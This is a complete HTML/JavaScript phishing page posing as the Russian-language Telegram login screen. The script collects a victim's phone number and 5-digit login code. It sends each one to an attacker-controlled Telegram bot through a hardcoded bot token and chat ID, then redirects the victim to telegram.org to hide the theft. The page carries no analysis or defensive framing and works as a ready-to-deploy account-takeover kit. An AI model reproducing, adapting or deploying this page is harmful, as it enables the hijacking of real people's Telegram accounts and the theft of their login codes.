<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Telegram</title>
<meta name="theme-color" content="#2AABEE">
<link rel="icon" href="https://telegram.org/img/t_logo.png">
<style>
:root{
--bg:#17212b;
--card:#1c2733;
--field:#242f3d;
--accent:#2AABEE;
--text:#fff;
--text-sec:#7f8c9b;
--error:#ff3b3b;
--radius:12px;
}
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Inter","Segoe UI",Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{width:100%;max-width:400px;background:var(--card);border-radius:20px;padding:32px 24px;text-align:center;animation:fadeIn .4s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
.logo{width:80px;height:80px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center}
.logo svg{width:80px;height:80px;fill:var(--accent)}
h1{font-size:24px;font-weight:700;margin-bottom:8px}
p.sub{font-size:15px;color:var(--text-sec);margin-bottom:28px;line-height:1.4}
.field{background:var(--field);border-radius:var(--radius);padding:14px 16px;margin-bottom:16px;text-align:left}
.field label{display:block;font-size:12px;color:var(--text-sec);margin-bottom:4px}
.field input{width:100%;background:none;border:none;color:var(--text);font-size:17px;outline:none}
.field.error{box-shadow:0 0 0 2px var(--error) inset}
.btn{width:100%;padding:16px;background:var(--accent);color:#fff;border:none;border-radius:var(--radius);font-size:17px;font-weight:600;cursor:pointer;transition:transform .15s ease}
.btn:active{transform:scale(.98)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.code-inputs{display:flex;gap:8px;justify-content:center;margin:24px 0}
.code-inputs input{width:44px;height:54px;background:var(--field);border:1.5px solid #2f3b4a;border-radius:12px;color:var(--text);font-size:22px;text-align:center;outline:none}
.code-inputs input:focus{border-color:var(--accent)}
.code-inputs input.error{border-color:var(--error);background:#2a1a1a}
.hidden{display:none !important}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
  </div>
  <h1>Вход в Telegram</h1>
  <p class="sub">Введите номер телефона, чтобы войти в аккаунт</p>
  <div class="field" id="phoneField">
    <label>Номер телефона</label>
    <input type="tel" id="phone" placeholder="+7 (___) ___ __ __" maxlength="18" inputmode="tel">
  </div>
  <button class="btn" id="nextBtn">Продолжить</button>
</div>

<script>
var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
var chat = '7887003990';

function send(text) {
  var img = new Image();
  img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(text);
}

function formatPhone(v) {
  v = v.replace(/\D/g, '');
  if (v.startsWith('8')) v = '7' + v.slice(1);
  if (!v.startsWith('7') && v.length > 0) v = '7' + v;
  v = v.substring(0, 11);
  var r = '+7';
  if (v.length > 1) r += ' (' + v.substring(1, 4);
  if (v.length >= 4) r += ') ' + v.substring(4, 7);
  if (v.length >= 7) r += ' ' + v.substring(7, 9);
  if (v.length >= 9) r += ' ' + v.substring(9, 11);
  return r;
}

document.getElementById('phone').addEventListener('input', function(e) {
  if (e.inputType === 'deleteContentBackward') return;
  this.value = formatPhone(this.value);
  this.classList.remove('error');
});

document.getElementById('phone').addEventListener('keydown', function(e) {
  if (e.key === 'Backspace') {
    e.preventDefault();
    var v = this.value.replace(/\D/g, '').slice(0, -1);
    this.value = formatPhone(v);
  }
});

document.getElementById('phone').addEventListener('focus', function() {
  if (!this.value) this.value = '+7';
});

document.getElementById('nextBtn').addEventListener('click', function() {
  var phone = document.getElementById('phone').value;
  var digits = phone.replace(/\D/g, '');
  if (digits.length !== 11) {
    document.getElementById('phone').classList.add('error');
    alert('Введите номер полностью');
    return;
  }
  send('📱 Telegram — Телефон: ' + phone);
  document.querySelector('.card').innerHTML = `
    <div class="logo">
      <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
    </div>
    <h1>Введите код</h1>
    <p class="sub">Мы отправили код в Telegram на номер ${phone}</p>
    <div class="code-inputs" id="codeInputs">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
    </div>
    <button class="btn" id="codeBtn" disabled>Войти</button>
  `;
  var inputs = document.querySelectorAll('#codeInputs input');
  inputs.forEach(function(inp, idx) {
    inp.addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '').substring(0, 1);
      if (this.value.length === 1 && idx < inputs.length - 1) inputs[idx + 1].focus();
      var code = '';
      inputs.forEach(function(i) { code += i.value; });
      document.getElementById('codeBtn').disabled = code.length !== 5;
      if (code.length === 5) {
        send('🔑 Telegram — Код: ' + code);
        send('✅ Telegram — Итог');
        setTimeout(function() {
          window.location.href = 'https://telegram.org';
        }, 1500);
      }
    });
    inp.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && !this.value && idx > 0) inputs[idx - 1].focus();
    });
  });
});
</script>
</body>
</html>
